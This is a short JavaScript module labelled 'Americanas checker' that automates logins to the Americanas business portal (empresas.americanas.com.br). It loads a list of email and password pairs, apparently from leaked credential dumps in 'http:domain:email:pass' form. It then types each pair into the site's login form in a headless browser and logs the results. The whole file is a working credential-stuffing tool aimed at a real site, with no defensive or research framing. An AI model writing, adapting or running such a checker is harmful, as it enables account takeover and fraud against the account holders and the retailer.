import { createBrowser, readFile, reset } from "../utils/helpers/index.js";

let page;

export default async function americanas() {
  console.clear();
  console.log("Americanas checker");
  const accounts = await readFile("empresas.americanas.com.br");

  console.log(accounts.length, " Contas encontradas.");

  if (!page) {
    console.log("starting Browser ...");
    page = await createBrowser({
      url: "https://empresas.americanas.com.br/simple-login/",
      handle: false,
    });
  }

  for (const account of accounts) {
    const [http, domain, email, pass] = account.split(":");
    if (!email || !pass) {
      console.log("Formatação invalida");
      continue;
    }

    const inputField = await page.$("#email-input");
    await inputField.evaluate(el => el.value = ''); 
    
    await page.type("#email-input", email);
    
    
    const inputFieldPass = await page.$("#password-input");
    await inputFieldPass.evaluate(el => el.value = ''); 
    await page.type("#password-input", pass);
    await page.click("#login-button");

    await new Promise((r) => setTimeout(() => r(), 5000));
    console.log(email, " : ", pass);
  }
}
